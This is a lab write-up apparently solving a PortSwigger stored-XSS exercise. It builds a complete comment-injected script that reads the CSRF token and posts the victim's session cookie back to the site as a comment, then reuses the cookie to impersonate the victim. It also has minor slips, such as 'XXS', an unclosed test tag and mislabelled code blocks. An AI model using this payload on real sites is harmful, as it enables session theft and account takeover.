# Description

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

# Note

> To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

> Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie.

# Solution

This task can be solved in two ways, but since most users do not have Burp Collaborator's, we will use a slightly more difficult method. It will involve first detecting XXS, and then using this attack to perform another cross-site request forgery (CSRF) attack, which will result in cookie theft.

---

<h1>Cross-site request forgery (CSRF)</h1> is an attack in which an attacker tricks an authenticated user's browser into sending an unwanted request to a trusted site on their behalf, using their session.

<h1>CSRF (Cross-Site Request Forgery) tokens</h1> are unique, random secret values that a web server generates for each session to protect against cross-site request forgery attacks, which force users to perform unwanted actions on a website.

<h1>Session cookies</h1> are temporary pieces of data that a user's browser stores during a visit to a website to keep it active.

---

Let's start by reproducing the XXS attack. Enter our payload in the Comment field.

```python
<script>alert("KRY")</script
```
<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS78.png" alt="XXS" />
</p>

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS79.png" alt="XXS" />
</p>

We managed to reproduce the XXS attack, now let's move on to CSRF.

Let's intercept the request through Burp Suite and see the details that are important to us: our session cookie, CSRF token, and our payload. This is what we need for our attack. You can also get the CSRF token through the DOM. You can see it in the tags in the source code.

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS80.png" alt="XXS" />
</p>

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS81.png" alt="XXS" />
</p>

You can also obtain a CSRF token by entering the following in the user tools > console

```python
document.getElementsByName('csrf')[0].value
```
<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS82.png" alt="XXS" />
</p>

The source code contains important details for creating our payload: name csrf, postId, comment, name, and email.

Let's create our payload 

create a variable data where we will place the constructor `FormData()`

```javascript
var data = new FormData();
```
Now we can add the necessary fields such as email name and so on using .append()

```javascript
var data = new FormData();
data.append('csrf', token); 
data.append('postId', 8); 
data.append('comment', document.cookie);
data.append('name', 'toni');
data.append('email', 'toni@toni.com');
data.append('website', 'http://toni.com'); 
```
Define token.

```javascript
var token = document.getElementsByName('csrf')[0].value
var data = new FormData();
data.append('csrf', token); 
data.append('postId', 8); 
data.append('comment', document.cookie);
data.append('name', 'toni');
data.append('email', 'toni@toni.com');
data.append('website', 'http://toni.com');
```
Now we need to add fetch to send a POST request.

```javascript
fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});
```
Now we are adding an event handler so that our code is processed only after the page has loaded.

```javascript
window.addEventListener('DOMContentLoaded', function() {

var token = document.getElementsByName('csrf')[0].value
var data = new FormData();

data.append('csrf', token); 
data.append('postId', 8); 
data.append('comment', document.cookie);
data.append('name', 'toni');
data.append('email', 'toni@toni.com');
data.append('website', 'http://toni.com');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});

});
```

Add <script> and this is how our payload should look in the end

```javascript
<script>
window.addEventListener('DOMContentLoaded', function() {

var token = document.getElementsByName('csrf')[0].value
var data = new FormData();

data.append('csrf', token); 
data.append('postId', 8); 
data.append('comment', document.cookie);
data.append('name', 'toni');
data.append('email', 'toni@toni.com');
data.append('website', 'http://toni.com');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});

});
</script>
```
Now let's insert our payload into the comment.

After we submit the comment and return to the blog, we will see that a comment with a cookie and token has been published. In the final step, we will intercept the request and insert 

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS83.png" alt="XXS" />
</p>

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS84.png" alt="XXS" />
</p>

```python
Cookie: session=890CaIyXKmDZoCoPznSu2Jyf66WP5eBI
```

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS85.png" alt="XXS" />
</p>

Click on Render and complete the task. 
